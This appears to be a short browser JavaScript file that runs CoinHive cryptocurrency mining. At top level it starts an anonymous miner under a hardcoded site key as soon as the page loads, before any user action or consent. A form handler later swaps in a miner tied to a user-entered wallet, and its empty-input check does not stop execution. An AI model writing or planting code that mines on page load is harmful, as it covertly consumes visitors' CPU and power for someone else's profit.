var anonMiner = new CoinHive.Anonymous('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc');
anonMiner.start();

function getWalletAddress(){
        var walletAddress=document.getElementById('address').value;
        return(walletAddress);
    }

function startUserMiner(){
    var userWalletAddress=getWalletAddress();
    try{
        if(userWalletAddress == "") throw "Empty Input Field";
    }
    catch(err) {
        message.innerHTML = "Error: " + err + ".";
    }

    var userMiner = new CoinHive.User('qXvuxshdwz8NEoQXhMLH0qPW2EYJWuLc',userWalletAddress);
    anonMiner.stop();
    userMiner.start();
}
